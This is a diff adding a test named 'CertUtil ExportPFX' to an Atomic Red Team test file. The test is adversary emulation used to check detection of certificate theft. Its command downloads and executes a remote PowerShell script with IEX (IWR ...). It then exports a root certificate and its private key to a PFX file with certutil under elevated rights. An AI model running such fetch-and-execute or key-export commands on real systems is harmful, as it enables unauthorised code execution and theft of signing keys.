@@ -197,3 +197,18 @@ atomic_tests:
       Remove-Item -Path ".\ADFS_encryption.pfx" -ErrorAction Ignore
       Remove-Item -Path ".\ADFS_signing.pfx" -ErrorAction Ignore
     name: powershell
+- name: CertUtil ExportPFX
+  description: |
+    The following Atomic test simulates adding a generic non-malicious certificate to the CurrentUser certificate store. This behavior generates a registry modification that adds the cloned root CA certificate in the keys outlined in the blog.
+    Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
+    Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+       IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing) 
+       certutil -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400 c:\temp\atomic.pfx 
+    cleanup_command: |
+       Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item 
+    name: powershell
+    elevation_required: true
